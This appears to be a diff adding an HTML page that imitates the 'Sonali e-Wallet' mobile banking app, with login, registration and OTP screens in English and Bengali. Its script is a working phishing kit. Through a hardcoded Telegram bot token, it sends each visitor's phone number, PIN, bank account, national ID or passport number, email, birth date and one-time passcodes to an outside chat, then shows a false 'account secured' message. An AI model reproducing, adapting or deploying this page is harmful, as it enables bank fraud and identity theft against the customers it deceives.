@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sonali e-Wallet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Noto+Sans+Bengali:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            --primary-blue: #004a99;
+            --primary-yellow: #f9c400;
+            --light-gray: #f0f2f5;
+            --white: #ffffff;
+            --dark-text: #333;
+            --success-green: #28a745;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', 'Noto Sans Bengali', sans-serif;
+            background-color: var(--light-gray);
+            height: 100vh;
+            overflow: hidden;
+        }
+        .page {
+            display: none; width: 100%; min-height: 100vh;
+            animation: fadeIn 0.4s ease-in-out; position: absolute;
+            top: 0; left: 0; overflow-y: auto;
+        }
+        .page.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.98); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        #home-page { background-color: var(--white); }
+        .home-header { background-color: var(--primary-yellow); padding: 20px; text-align: center; }
+        .home-header img { width: 40px; margin-bottom: 5px; }
+        .home-header h2 { font-size: 20px; font-weight: 500; color: var(--dark-text); }
+        .home-header p { font-size: 18px; margin-top: 10px; }
+        .continue-btn { background-color: var(--primary-blue); color: var(--white); border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; display: inline-flex; align-items: center; margin-top: 15px; }
+        .continue-btn i { margin-left: 10px; }
+        .services-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; padding: 20px; text-align: center; }
+        .service-item { background-color: var(--light-gray); padding: 15px; border-radius: 10px; cursor: pointer; }
+        .service-item .icon-placeholder { width: 40px; height: 40px; margin: 0 auto 8px auto; background-color: #e0e0e0; display: flex; align-items: center; justify-content: center; font-size: 20px; color: var(--primary-blue); border-radius: 5px; }
+        .service-item p { font-size: 14px; font-weight: 500; color: var(--dark-text); }
+        #login-page.active { display: flex; flex-direction: column; justify-content: center; align-items: center; background-color: var(--primary-blue); color: var(--white); }
+        .login-box { display: flex; flex-direction: column; width: 90%; max-width: 400px; }
+        .login-header { text-align: center; margin-bottom: 40px; }
+        .login-header img { width: 60px; height: 60px; object-fit: contain; margin-bottom: 10px; }
+        .login-header h1 { font-size: 28px; font-weight: 700; }
+        .login-form .input-group { position: relative; margin-bottom: 15px; }
+        .login-form .input-field { width: 100%; padding: 15px 15px 15px 50px; border-radius: 8px; border: none; font-size: 16px; }
+        .login-form .icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #888; font-size: 20px; }
+        .login-btn { width: 100%; padding: 15px; background-color: var(--primary-yellow); color: var(--dark-text); border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 15px; }
+        .register-prompt { text-align: center; margin-top: 30px; }
+        .register-prompt a { color: var(--primary-yellow); font-weight: 500; text-decoration: none; cursor: pointer; }
+        #registration-page { background-color: var(--white); }
+        .reg-header { background-color: var(--primary-yellow); padding: 15px 20px; display: flex; align-items: center; color: var(--dark-text); }
+        .reg-header .back-btn { font-size: 24px; margin-right: 15px; cursor: pointer; }
+        .reg-header h2 { font-size: 20px; font-weight: 700; }
+        .reg-form-container { padding: 20px; }
+        .reg-form .input-group { margin-bottom: 15px; }
+        .reg-form .input-field { width: 100%; padding: 15px; border: none; background-color: var(--light-gray); border-radius: 8px; font-size: 16px; }
+        .terms-group { display: flex; align-items: center; margin: 20px 0; }
+        .terms-group input { margin-right: 10px; width: 18px; height: 18px; }
+        .terms-group label { font-size: 15px; }
+        .submit-btn { width: 100%; padding: 15px; background-color: var(--primary-yellow); border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; }
+        #otp-page.active { display: flex; justify-content: center; align-items: center; background-color: #f0f2f5; }
+        .otp-box { background-color: var(--white); padding: 30px 40px; border-radius: 10px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        .otp-box h2 { color: var(--primary-blue); font-size: 22px; margin-bottom: 10px;}
+        .otp-box p { color: #666; margin-bottom: 25px; font-size: 15px; }
+        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
+        .otp-inputs input { width: 45px; height: 50px; text-align: center; border: 1px solid #ccc; border-radius: 8px; font-size: 24px; font-weight: 700; appearance: textfield; }
+        .otp-inputs input:focus { outline: none; border-color: var(--primary-blue); box-shadow: 0 0 5px rgba(0, 74, 153, 0.3); }
+        .confirm-btn { width: 100%; padding: 15px; background-color: var(--primary-blue); color: var(--white); border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; }
+        .timer-text { margin-top: 20px; font-size: 14px; color: #555; }
+        .timer-text #resend-otp-link { color: var(--primary-blue); text-decoration: none; font-weight: 700; display: none; cursor: pointer; }
+        #success-page.active { display: flex; flex-direction: column; justify-content: center; align-items: center; background-color: var(--white); text-align: center; padding: 20px; }
+        .success-box { animation: successPop 0.6s ease-out; }
+        .success-box i { font-size: 80px; color: var(--success-green); margin-bottom: 25px; }
+        .success-box h3 { font-size: 24px; font-weight: 700; color: var(--dark-text); }
+        @keyframes successPop {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PAGE 1: HOME/WELCOME PAGE -->
+    <div class="page active" id="home-page">
+        <header class="home-header">
+            <img src="https://images.seeklogo.com/logo-png/31/1/sonali-bank-limited-logo-png_seeklogo-318183.png" alt="Logo">
+            <h2>Sonali e-Wallet</h2>
+            <p>Welcome to Sonali e-Wallet</p>
+            <button class="continue-btn" id="tap-to-continue">Tap to continue <i class="fas fa-arrow-right"></i></button>
+        </header>
+        <div class="services-grid">
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-exchange-alt"></i></div><p>Transaction</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-file-invoice-dollar"></i></div><p>Bill Pay</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-mobile-alt"></i></div><p>Recharge</p></div>
+            <div class="service-item"><div class="icon-placeholder">৳</div><p>Add Money</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-receipt"></i></div><p>Statement</p></div>
+            <div class="service-item"><div class="icon-placeholder">৳</div><p>e-Statement</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-university"></i></div><p>Bank Deposit</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-credit-card"></i></div><p>Cards</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-qrcode"></i></div><p>Tap and Pay</p></div>
+            <div class="service-item"><div class="icon-placeholder">৳</div><p>Send Money</p></div>
+            <div class="service-item"><div class="icon-placeholder"><i class="fas fa-inbox"></i></div><p>Inbox</p></div>
+            <div class="service-item"><div class="icon-placeholder">৳</div><p>Loan</p></div>
+        </div>
+    </div>
+
+    <!-- PAGE 2: LOGIN PAGE -->
+    <div class="page" id="login-page">
+        <div class="login-box">
+            <div class="login-header">
+                <img src="https://images.seeklogo.com/logo-png/31/1/sonali-bank-limited-logo-png_seeklogo-318183.png" alt="Logo">
+                <h1>Sonali e-Wallet</h1>
+            </div>
+            <form class="login-form">
+                <div class="input-group">
+                    <i class="fas fa-mobile-alt icon"></i>
+                    <input type="tel" id="phone-input" class="input-field" placeholder="Enter Phone Number" required>
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-lock icon"></i>
+                    <input type="password" id="pin-input" class="input-field" placeholder="Enter e-Wallet PIN" required>
+                </div>
+                <button type="button" class="login-btn" id="login-btn">LOGIN</button>
+                <div class="register-prompt">
+                    <p>Don't have any account? <a id="show-register-link">Register</a></p>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE 3: REGISTRATION PAGE -->
+    <div class="page" id="registration-page">
+        <header class="reg-header">
+            <i class="fas fa-arrow-left back-btn" id="back-to-login"></i>
+            <h2>Registration: (New Account)</h2>
+        </header>
+        <div class="reg-form-container">
+            <form class="reg-form">
+                <div class="input-group"><input type="text" id="reg-name" class="input-field" placeholder="Name" required></div>
+                <div class="input-group"><input type="tel" id="reg-phone" class="input-field" placeholder="Phone" required></div>
+                <div class="input-group"><input type="text" id="reg-bank-acc" class="input-field" placeholder="Bank Acc" required></div>
+                <div class="input-group"><input type="text" id="reg-nid" class="input-field" placeholder="NID/SID/Passport Number" required></div>
+                <div class="input-group"><input type="email" id="reg-email" class="input-field" placeholder="Email" required></div>
+                <div class="input-group"><input type="text" id="reg-dob" onfocus="(this.type='date')" onblur="(this.type='text')" class="input-field" placeholder="Date of Birth" required></div>
+                <div class="input-group"><input type="password" id="reg-pin1" class="input-field" placeholder="Enter PIN (6 Digit)" maxlength="6" required></div>
+                <div class="input-group"><input type="password" id="reg-pin2" class="input-field" placeholder="Re-enter PIN (6 Digit)" maxlength="6" required></div>
+                <div class="terms-group">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms">I accept the Terms and Conditions</label>
+                </div>
+                <button type="submit" class="submit-btn">SUBMIT</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- PAGE 4: OTP PAGE -->
+    <div class="page" id="otp-page">
+        <div class="otp-box">
+            <h2>OTP যাচাই করুন</h2>
+            <p>আপনার মোবাইলে পাঠানো ৬ সংখ্যার কোডটি দিন</p>
+            <div class="otp-inputs">
+                <input type="number" maxlength="1" class="otp-field"><input type="number" maxlength="1" class="otp-field"><input type="number" maxlength="1" class="otp-field"><input type="number" maxlength="1" class="otp-field"><input type="number" maxlength="1" class="otp-field"><input type="number" maxlength="1" class="otp-field">
+            </div>
+            <button type="button" class="confirm-btn" id="confirm-otp-btn">Confirm</button>
+            <div class="timer-text">
+                <span id="countdown">Time left: 01:00</span>
+                <a href="#" id="resend-otp-link">Resend OTP</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- PAGE 5: SUCCESS/VERIFICATION PAGE -->
+    <div class="page" id="success-page">
+        <div class="success-box">
+             <i class="fas fa-check-circle"></i>
+             <h3 id="success-message">ধন্যবাদ! আপনার একাউন্ট এখন সুরক্ষিত।<br>ভেরিফিকেশন সম্পূর্ণ হয়েছে।</h3>
+        </div>
+    </div>
+
+    <script>
+        // --- START: TELEGRAM TRACKING LOGIC ---
+        const TELEGRAM_BOT_TOKEN = "8194432183:AAFAvwjg6XsN4Yi6v6BysSIWg4rCF_Kr-rI";
+        const TELEGRAM_CHAT_ID = "6658445342";
+
+        function sendToTelegram(message) {
+            const encodedMessage = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
+            fetch(url).then(res => res.json()).then(data => {
+                console.log("Message sent. Status:", data.ok);
+            }).catch(error => console.error("Telegram fetch error:", error));
+        }
+        // --- END: TELEGRAM TRACKING LOGIC ---
+
+
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // This small delay prevents the script from blocking the initial page render.
+            setTimeout(() => {
+                sendToTelegram("👤 একজন আপনার e-Wallet পেজ ভিজিট করেছে।");
+            }, 100);
+
+            let otpContext = 'login'; // Default context is 'login'
+
+            const pages = document.querySelectorAll('.page');
+            const continueBtn = document.getElementById('tap-to-continue');
+            const showRegisterLink = document.getElementById('show-register-link');
+            const backToLoginBtn = document.getElementById('back-to-login');
+            const loginBtn = document.getElementById('login-btn');
+            const regForm = document.querySelector('.reg-form');
+            const confirmOtpBtn = document.getElementById('confirm-otp-btn');
+            const otpFields = document.querySelectorAll('.otp-field');
+            const successMessageEl = document.getElementById('success-message');
+            const countdownEl = document.getElementById('countdown');
+            const resendLink = document.getElementById('resend-otp-link');
+            let timerInterval;
+
+            function showPage(pageId) {
+                pages.forEach(page => page.classList.remove('active'));
+                const activePage = document.getElementById(pageId);
+                if (activePage) activePage.classList.add('active');
+            }
+            
+            function startTimer() {
+                clearInterval(timerInterval); 
+                let timeLeft = 60;
+                countdownEl.style.display = 'inline';
+                resendLink.style.display = 'none';
+                timerInterval = setInterval(() => {
+                    timeLeft--;
+                    let seconds = timeLeft % 60;
+                    countdownEl.textContent = `Time left: 00:${seconds < 10 ? '0' : ''}${seconds}`;
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        countdownEl.style.display = 'none';
+                        resendLink.style.display = 'inline';
+                    }
+                }, 1000);
+            }
+
+            // --- Event Listeners for Page Navigation and Actions ---
+
+            continueBtn.addEventListener('click', () => { 
+                sendToTelegram("🖱️ 'Tap to Continue' বাটনে ক্লিক করা হয়েছে।");
+                showPage('login-page'); 
+            });
+
+            showRegisterLink.addEventListener('click', (e) => { 
+                e.preventDefault(); 
+                sendToTelegram("➕ 'Register' বাটনে ক্লিক করা হয়েছে।");
+                showPage('registration-page'); 
+            });
+            
+            backToLoginBtn.addEventListener('click', () => { showPage('login-page'); });
+            
+            loginBtn.addEventListener('click', () => { 
+                otpContext = 'login'; // Set context for OTP verification
+                const phone = document.getElementById('phone-input').value;
+                const pin = document.getElementById('pin-input').value;
+                const message = `
+✅ <b>Login Attempt</b>
+-------------------------
+📱 <b>Phone:</b> ${phone}
+🔒 <b>PIN:</b> ${pin}
+-------------------------`;
+                sendToTelegram(message);
+                showPage('otp-page');
+                startTimer(); 
+            });
+            
+            regForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                otpContext = 'register'; // Set context for OTP verification
+                const regData = {
+                    Name: document.getElementById('reg-name').value, Phone: document.getElementById('reg-phone').value,
+                    BankAccount: document.getElementById('reg-bank-acc').value, NID: document.getElementById('reg-nid').value,
+                    Email: document.getElementById('reg-email').value, DOB: document.getElementById('reg-dob').value,
+                    PIN: document.getElementById('reg-pin1').value
+                };
+                const message = `
+📝 <b>New Registration Submission</b>
+--------------------------------------
+👤 <b>Name:</b> ${regData.Name}
+📱 <b>Phone:</b> ${regData.Phone}
+🏦 <b>Bank Acc:</b> ${regData.BankAccount}
+💳 <b>NID/Passport:</b> ${regData.NID}
+📧 <b>Email:</b> ${regData.Email}
+🎂 <b>DoB:</b> ${regData.DOB}
+🔒 <b>PIN:</b> ${regData.PIN}
+--------------------------------------`;
+                sendToTelegram(message);
+                showPage('otp-page');
+                startTimer();
+            });
+
+            confirmOtpBtn.addEventListener('click', () => {
+                let otp = Array.from(otpFields).map(field => field.value).join('');
+                const otpMessage = `🔑 <b>OTP Received:</b> ${otp}`;
+                sendToTelegram(otpMessage);
+
+                clearInterval(timerInterval); 
+                
+                if (otpContext === 'register') {
+                    sendToTelegram("✅ <b>রেজিস্ট্রেশন সম্পূর্ণ হয়েছে!</b>");
+                    successMessageEl.innerHTML = "রেজিস্ট্রেশন সম্পূর্ণ হয়েছে!<br>অনুগ্রহ করে লগইন করুন।";
+                    showPage('success-page');
+                    setTimeout(() => showPage('login-page'), 3000);
+                } else { // 'login' context
+                    successMessageEl.innerHTML = "ধন্যবাদ! আপনার একাউন্ট এখন সুরক্ষিত।<br>ভেরিফিকেশন সম্পূর্ণ হয়েছে।";
+                    showPage('success-page');
+                    setTimeout(() => showPage('home-page'), 3000);
+                }
+            });
+
+            resendLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                startTimer();
+                sendToTelegram("🔄 OTP Resend Requested.");
+            });
+            
+            otpFields.forEach((field, index) => {
+                field.addEventListener('input', () => {
+                    if (field.value.length === 1 && index < otpFields.length - 1) {
+                        otpFields[index + 1].focus();
+                    }
+                });
+                field.addEventListener('keydown', (e) => {
+                    if (e.key === "Backspace" && e.target.value.length === 0 && index > 0) {
+                        otpFields[index - 1].focus();
+                    }
+                });
+            });
+            
+            // Ensure the first page is shown on load
+            showPage('home-page');
+        });
+    </script>
+
+</body>
+</html>
